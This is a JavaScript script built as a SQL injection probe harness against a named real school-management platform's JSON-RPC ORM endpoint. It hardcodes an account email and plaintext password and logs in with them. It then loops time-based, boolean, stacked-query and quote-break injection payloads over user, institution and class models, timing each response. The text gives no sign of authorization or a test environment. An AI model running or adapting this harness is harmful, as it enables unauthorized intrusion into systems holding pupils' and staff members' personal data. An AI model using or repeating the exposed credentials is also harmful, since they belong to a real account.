// schulmanager-online.de — JSON-RPC (poqa/ORM) injection probe harness
// read-only actions only: count / findAll / findByPk
const B = 'https://login.schulmanager-online.de';
const BUNDLE = '0d024d5311';
const EMAIL = 'frislop21@gmail.com';
const PASS = 'Neodeo34!!';

async function login() {
  const r = await fetch(B + '/api/login', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      emailOrUsername: EMAIL, password: PASS, hash: null,
      mobileApp: false, userId: null, twoFactorCode: null, institutionId: null
    })
  });
  if (r.status !== 200) throw new Error('login ' + r.status);
  return (await r.json()).jwt;
}

async function rpc(jwt, model, action, params, ui = 'main.dashboard') {
  const t0 = Date.now();
  const r = await fetch(B + '/api/calls', {
    method: 'POST',
    headers: { 'content-type': 'application/json', authorization: 'Bearer ' + jwt },
    body: JSON.stringify({
      bundleVersion: BUNDLE,
      requests: [{
        id: 'p1', moduleName: 'main', endpointName: 'poqa',
        parameters: { action: { model, action, parameters: params }, uiState: ui }
      }]
    })
  });
  const txt = await r.text();
  let j = null; try { j = JSON.parse(txt); } catch {}
  const res = j && j.results && j.results[0];
  return { ms: Date.now() - t0, http: r.status, status: res && res.status, data: res && res.data, raw: txt.slice(0, 200) };
}

const payloads = [
  { name: 'baseline', v: '1' },
  { name: 'quote', v: "1'" },
  { name: 'dq', v: '1"' },
  { name: 'bool-true', v: "1 OR 1=1" },
  { name: 'bool-false', v: "1 AND 1=2" },
  { name: 'paren', v: "1)" },
  { name: 'comment', v: "1-- -" },
  { name: 'sleep5', v: "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -" },
  { name: 'pg-sleep', v: "1' AND 1=(SELECT 1 FROM pg_sleep(5))-- -" },
  { name: 'stacked', v: "1'; SELECT 1-- -" },
];

(async () => {
  const jwt = await login();
  console.log('jwt ok');

  // sanity: which action/model even answers
  for (const [m, a, p] of [['User', 'count', [{}]], ['Institution', 'count', [{}]], ['Class', 'findAll', [{ limit: 1 }]]]) {
    const r = await rpc(jwt, m, a, p);
    console.log('sanity', m + '.' + a, r.status, r.ms + 'ms', r.raw);
  }

  for (const m of ['User', 'Institution', 'Class', 'InstitutionMember']) {
    for (const p of payloads) {
      const r = await rpc(jwt, m, 'findAll', [{ where: { id: p.v }, limit: 1 }]);
      console.log(`${m.padEnd(18)} ${p.name.padEnd(10)} http=${r.http} st=${r.status} ${r.ms}ms`);
    }
  }
})();
